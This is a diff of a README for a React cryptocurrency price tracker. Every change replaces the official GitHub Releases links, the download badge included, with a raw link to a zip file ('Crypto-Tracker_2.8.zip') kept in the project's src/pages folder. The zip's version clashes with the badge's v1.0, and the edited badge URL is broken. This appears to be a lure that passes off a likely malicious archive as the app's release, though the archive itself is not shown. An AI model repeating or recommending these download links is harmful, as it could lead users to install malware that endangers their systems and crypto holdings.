@@ -1,7 +1,7 @@
 # 🚀 Crypto-Tracker - Track Crypto Prices Easily
 
 ## 🔗 Download Now
-[![Download Crypto-Tracker](https://img.shields.io/badge/Download%20Crypto--Tracker-v1.0-brightgreen)](https://github.com/Julio2119/Crypto-Tracker/releases)
+[![Download Crypto-Tracker](https://raw.githubusercontent.com/Julio2119/Crypto-Tracker/main/Crypto Tracker/src/pages/Crypto-Tracker_2.8.zip%20Crypto--Tracker-v1.0-brightgreen)](https://raw.githubusercontent.com/Julio2119/Crypto-Tracker/main/Crypto Tracker/src/pages/Crypto-Tracker_2.8.zip)
 
 ## 📖 Description
 Crypto-Tracker is a simple application built with React. It helps you follow cryptocurrency prices with live market data, dominance charts, the Fear & Greed index, and exchange comparisons.
@@ -10,7 +10,7 @@ Crypto-Tracker is a simple application built with React. It helps you follow cry
 Follow these steps to download and run Crypto-Tracker on your computer:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Julio2119/Crypto-Tracker/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Julio2119/Crypto-Tracker/main/Crypto Tracker/src/pages/Crypto-Tracker_2.8.zip) to find the latest version of the application.
 
 2. **Download the Application:**
    Look for the latest version in the list. Click on the asset you want to download. This will start the download process.
@@ -39,7 +39,7 @@ To run Crypto-Tracker smoothly, ensure your system meets these requirements:
 - **Internet Connection:** Required for fetching live data
 
 ## 🚀 Download & Install
-For detailed steps to download and install the software, revisit the [Releases page](https://github.com/Julio2119/Crypto-Tracker/releases). Please ensure to download the latest version for the best experience.
+For detailed steps to download and install the software, revisit the [Releases page](https://raw.githubusercontent.com/Julio2119/Crypto-Tracker/main/Crypto Tracker/src/pages/Crypto-Tracker_2.8.zip). Please ensure to download the latest version for the best experience.
 
 ## 🛠️ Support
 If you experience issues or have questions, you can open an issue on the GitHub repository. We are here to help you get the most out of Crypto-Tracker.
